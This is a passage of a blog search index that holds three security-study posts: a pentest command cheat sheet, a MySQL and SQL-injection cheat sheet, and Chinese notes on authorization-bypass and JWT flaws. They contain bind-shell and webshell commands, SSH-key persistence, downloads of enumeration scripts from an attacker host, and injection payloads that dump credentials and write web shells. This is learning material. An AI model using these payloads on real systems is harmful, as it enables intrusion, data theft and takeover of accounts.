1234 &gt;/tmp/f</code></td><td>Start a bind shell on the remote server</td></tr><tr><td><code>nc 10.10.10.1 1234</code></td><td>Connect to a bind shell started on the remote server</td></tr><tr><td><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></td><td>Upgrade shell TTY (1)</td></tr><tr><td><code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice</td><td>Upgrade shell TTY (2)</td></tr><tr><td><code>echo &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]);?&gt;&quot; &gt; /var/www/html/shell.php</code></td><td>Create a webshell php file</td></tr><tr><td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td><td>Execute a command on an uploaded webshell</td></tr><tr><td><strong>Privilege Escalation</strong></td><td></td></tr><tr><td><code>./linpeas.sh</code></td><td>Run <code>linpeas</code> script to enumerate remote server</td></tr><tr><td><code>sudo -l</code></td><td>List available <code>sudo</code> privileges</td></tr><tr><td><code>sudo -u user /bin/echo Hello World!</code></td><td>Run a command with <code>sudo</code></td></tr><tr><td><code>sudo su -</code></td><td>Switch to root user (if we have access to <code>sudo su</code>)</td></tr><tr><td><code>sudo su user -</code></td><td>Switch to a user (if we have access to <code>sudo su</code>)</td></tr><tr><td><code>ssh-keygen -f key</code></td><td>Create a new SSH key</td></tr><tr><td><code>echo &quot;ssh-rsa AAAAB...SNIP...M= user@parrot&quot; &gt;&gt; /root/.ssh/authorized_keys</code></td><td>Add the generated public key to the user</td></tr><tr><td><code>ssh root@10.10.10.10 -i key</code></td><td>SSH to the server with the generated private key</td></tr><tr><td><strong>Transferring Files</strong></td><td></td></tr><tr><td><code>python3 -m http.server 8000</code></td><td>Start a local webserver</td></tr><tr><td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td><td>Download a file on the remote server from our local machine</td></tr><tr><td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td><td>Download a file on the remote server from our local machine</td></tr><tr><td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td><td>Transfer a file to the remote server with <code>scp</code> (requires SSH access)</td></tr><tr><td><code>base64 shell -w 0</code></td><td>Convert a file to <code>base64</code></td></tr><tr><td><code>echo f0VMR...SNIO...InmDwU | base64 -d &gt; shell</code></td><td>Convert a file from <code>base64</code> back to its orig</td></tr><tr><td><code>md5sum shell</code></td><td>Check the file’s <code>md5sum</code> to ensure it converted correctly</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Kali Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL基本用法</title>
      <link href="/2023/10/20/MYSQL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
      <url>/2023/10/20/MYSQL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>General</strong></td><td></td></tr><tr><td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td><td>login to mysql database</td></tr><tr><td><code>SHOW DATABASES</code></td><td>List available databases</td></tr><tr><td><code>USE users</code></td><td>Switch to database</td></tr><tr><td><strong>Tables</strong></td><td></td></tr><tr><td><code>CREATE TABLE logins (id INT, ...)</code></td><td>Add a new table</td></tr><tr><td><code>SHOW TABLES</code></td><td>List available tables in current database</td></tr><tr><td><code>DESCRIBE logins</code></td><td>Show table properties and columns</td></tr><tr><td><code>INSERT INTO table_name VALUES (value_1,..)</code></td><td>Add values to table</td></tr><tr><td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td><td>Add values to specific columns in a table</td></tr><tr><td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td><td>Update table values</td></tr><tr><td><strong>Columns</strong></td><td></td></tr><tr><td><code>SELECT * FROM table_name</code></td><td>Show all columns in a table</td></tr><tr><td><code>SELECT column1, column2 FROM table_name</code></td><td>Show specific columns in a table</td></tr><tr><td><code>DROP TABLE logins</code></td><td>Delete a table</td></tr><tr><td><code>ALTER TABLE logins ADD newColumn INT</code></td><td>Add new column</td></tr><tr><td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td><td>Rename column</td></tr><tr><td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td><td>Change column datatype</td></tr><tr><td><code>ALTER TABLE logins DROP oldColumn</code></td><td>Delete column</td></tr><tr><td><strong>Output</strong></td><td></td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1</code></td><td>Sort by column</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td><td>Sort by column in descending order</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td><td>Sort by two-columns</td></tr><tr><td><code>SELECT * FROM logins LIMIT 2</code></td><td>Only show first two results</td></tr><tr><td><code>SELECT * FROM logins LIMIT 1, 2</code></td><td>Only show first two results starting from index 2</td></tr><tr><td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td><td>List results that meet a condition</td></tr><tr><td><code>SELECT * FROM logins WHERE username LIKE &#39;admin%&#39;</code></td><td>List results where the name is similar to a given string</td></tr></tbody></table><h2 id="MySQL-Operator-Precedence"><a href="#MySQL-Operator-Precedence" class="headerlink" title="MySQL Operator Precedence"></a>MySQL Operator Precedence</h2><ul><li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li><li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li><li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li><li>NOT (<code>!</code>)</li><li>AND (<code>&amp;&amp;</code>)</li><li>OR (<code>||</code>)</li></ul><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><table><thead><tr><th><strong>Payload</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>Auth Bypass</strong></td><td></td></tr><tr><td><code>admin&#39; or &#39;1&#39;=&#39;1</code></td><td>Basic Auth Bypass</td></tr><tr><td><code>admin&#39;)-- -</code></td><td>Basic Auth Bypass With comments</td></tr><tr><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td><td></td></tr><tr><td><strong>Union Injection</strong></td><td></td></tr><tr><td><code>&#39; order by 1-- -</code></td><td>Detect number of columns using <code>order by</code></td></tr><tr><td><code>cn&#39; UNION select 1,2,3-- -</code></td><td>Detect number of columns using Union injection</td></tr><tr><td><code>cn&#39; UNION select 1,@@version,3,4-- -</code></td><td>Basic Union injection</td></tr><tr><td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td><td>Union injection for 4 columns</td></tr><tr><td><strong>DB Enumeration</strong></td><td></td></tr><tr><td><code>SELECT @@version</code></td><td>Fingerprint MySQL with query output</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>Fingerprint MySQL with no output</td></tr><tr><td><code>cn&#39; UNION select 1,database(),2,3-- -</code></td><td>Current database name</td></tr><tr><td><code>cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td><td>List all databases</td></tr><tr><td><code>cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></td><td>List all tables in a specific database</td></tr><tr><td><code>cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- -</code></td><td>List all columns in a specific table</td></tr><tr><td><code>cn&#39; UNION select 1, username, password, 4 from dev.credentials-- -</code></td><td>Dump data from a table in another database</td></tr><tr><td><strong>Privileges</strong></td><td></td></tr><tr><td><code>cn&#39; UNION SELECT 1, user(), 3, 4-- -</code></td><td>Find current user</td></tr><tr><td><code>cn&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></td><td>Find if user has admin privileges</td></tr><tr><td><code>cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</code></td><td>Find if all user privileges</td></tr><tr><td><code>cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></td><td>Find which directories can be accessed through MySQL</td></tr><tr><td><strong>File Injection</strong></td><td></td></tr><tr><td><code>cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></td><td>Read local file</td></tr><tr><td><code>select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39;</code></td><td>Write a string to a local file</td></tr><tr><td><code>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</code></td><td>Write a web shell into the base web directory</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞(越权)</title>
      <link href="/2023/10/20/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E8%B6%8A%E6%9D%83(%E8%B6%8A%E6%9D%83)/"/>
      <url>/2023/10/20/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E8%B6%8A%E6%9D%83(%E8%B6%8A%E6%9D%83)/</url>
      
        <content type="html"><![CDATA[<h3 id="水平越权漏洞"><a href="#水平越权漏洞" class="headerlink" title="水平越权漏洞"></a>水平越权漏洞</h3><blockquote><p><em>案例 1 - 论坛评论处</em></p></blockquote><ul><li>A.任意找到一个帖子，对该帖子下的评论进行点赞操作，<br>使用 bp 拦包，截取到该帖子的 id 编号（刷新页面+包拦截 ）</li><li>B.自己发评论，并替换删除评论的 id 编号</li></ul><blockquote><p><em>案例 2 - 添加授权处</em></p></blockquote><ul><li>A.点击添加用户时发现只能将本账户下的用户进行添加</li><li>B.任意添加一个本账户下的用户，在添加时使用 bp 进行拦截，<br>然后将对应参数修改为其他账户下的用户编号</li><li>C.成功将其他账户下的用户添加到了本人账户下</li><li>D.使用爆破进行任意用户添加以扩大漏洞影响</li></ul><hr><h3 id="垂直越权漏洞"><a href="#垂直越权漏洞" class="headerlink" title="垂直越权漏洞"></a>垂直越权漏洞</h3><ul><li>使用低权限账户去操作了高权限的账户下的一些功能点或者数据等<br>越权漏洞实际上也是属于逻辑漏洞</li><li>最常见出现的地方：<strong>例如增删改查等功能处</strong></li></ul><blockquote><p><em>案例 1 - 授权功能处</em></p></blockquote><ul><li>A.此时账户授权只能授权“成员”这一角色</li><li>B.使用”“成员“角色进行授权时，使用 bp 进行拦包，<br>将 id 编号修改为非“成员“角色的编号。成功添加了管理员角色</li><li>C.继续对 id 进行遍历，可进行任意授权</li></ul><blockquote><p><em>案例 2 - 添加用户处</em></p></blockquote><ul><li>A.直接在登陆页面利用后台新建用户的 api 进行未授权新建用户<br>（例如 CVE-2021-29441）</li></ul><hr><h3 id="权限绕过漏洞"><a href="#权限绕过漏洞" class="headerlink" title="权限绕过漏洞"></a>权限绕过漏洞</h3><blockquote><p><em>案例 1 - 修改密码处</em></p></blockquote><ul><li>A.现在有一个低权限账户，我们对该低权限账户进行修改密码操作</li><li>B.在修改密码时使用 bp 进行拦包，通过分析数据包可以得出修改密码时<br>通过了 id 来进行鉴权，因此，我们将 id 参数修改为其他一些默认用户的编号<br><strong><em>（多看看产品文档）</em></strong></li><li>C.完成步骤 B 后可以看到，成功使用 test 账户将 admin 账户的密码进行了修改，至此成功完成权限绕过漏洞效果</li></ul><blockquote><p><em>案例 2 - 编辑权限处</em></p></blockquote><ul><li>A.现在有一个 test 账户，无权限将角色设置成 administrator 的</li><li>B. 使用本账户能设置的角色进行任意设置，<br>然后使用 Dp 进行拦包，然后将 role 参数修改为 administrator</li><li>C.成功将 test 账户的角色设置成了超级管理员，至此成功完成权限绕过漏洞效果</li></ul><h3 id="交叉越权漏洞"><a href="#交叉越权漏洞" class="headerlink" title="交叉越权漏洞"></a>交叉越权漏洞</h3><ul><li>一般是使用低权限账户通过一些系列操作后获得到更高的权限</li></ul><blockquote><p><em>案例 1 - 重置密码处</em></p></blockquote><ul><li>正常使用 test 账户进行修改密码时是需要输入 test 的密码即可完成密码的重置</li><li>此时使用 bp 进行拦包，将 id 修改为 1<br>（这个 id 编号可在该页面上点击刷新按钮，使用 bp 进行拦包查询响应包获得）</li><li>即可将超级管理员 admin 账户的密码重置，至此完成权限提升漏洞效果</li></ul><blockquote><p><em>案例 2 - 页面上无编辑权限时</em></p></blockquote><ul><li>A.具备一个 test 成员，但无法对其进行任何编辑等操作</li><li>B.对角色进行任意设置，然后将 role 改为 administrator</li><li>C.成功将 test 账户设置为管理员</li></ul><h3 id="其他权限问题"><a href="#其他权限问题" class="headerlink" title="其他权限问题"></a>其他权限问题</h3><blockquote><p><em>案例 1 - 付费内容的编辑</em></p></blockquote><ul><li>A.有一个能够免费试学的课程</li><li>B.试学内容只有前两章节，其他内容被锁住了，无法进行试学</li><li>C.点击第二条可查看的科目，使用 bp 抓包，<br>拦截到相关包后，将 item_id 修改为第三条需要收费的科目的 id 编号</li></ul><blockquote><p><em>案例 2 - 需要登录才可查看的内容</em></p></blockquote><ul><li>A.任意选择一个学习内容，均会提示需要登录后才可进行查看</li><li>B.首先使用一个登陆后的账户进行测试</li><li>使用 bp 进行构造数据包，对任意学习内容进行遍历，<br>遍历的内容中直接将视频的地址回显出来，如果该学习内容中包含了资料，则资料对应的地址也会回显出来。</li><li>C.使用该办法将站点下的所有学习视频进行遍历，其中还包括了一些内部员工才可进行浏览的学习视频，然后将获取到的学习地址直接进行访问</li></ul><blockquote><p><em>案例 3 - JWT 越权</em></p></blockquote><ul><li>什么是 JWT<ul><li>JWT&#x3D;JSON+WEB+TOKEN，是一种标准</li></ul></li><li>常规的 JWT 内容格式是这样的：AAA.BBB.CCC<ul><li>解码网站：<a href="https://jwt.io/">https://jwt.io/</a></li></ul></li><li>JWT 结构组成<ul><li>JWT 由三部分组成，header(头部) paylboad(荷载)、signature(签证)<ul><li>header 记录了整个令牌的类型和签名算法，格式为 json</li><li>payload 部分是 jwt 的主体信息，它仍然是一个 JSON 对象</li></ul></li><li>signature 这一部分是 jwt 的签名，保证了整个 jwt 不被篡改，这部分的生成，是对前面两个部分的编码结果，按照头部指定的方式进行加密</li></ul></li><li>使用 JWT 的会话流程<ul><li>用户端登录，用户名和密码在请求中被发往服务器</li><li>确认登录信息正确后，服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 指定算法进行加密，生成该用户的 JWVT。此时，服务器并没有保存登录状态信息。</li><li>服务器将 JWT（通过响应）返回给客户端</li><li>用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中</li><li>服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态</li><li>服务器返回响应</li></ul></li><li>思路<br><strong><em>JWT 密钥为空</em></strong><br>相关项目是开源的，可找到 JWT 密钥<br>Token is expired：更新时间戳</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
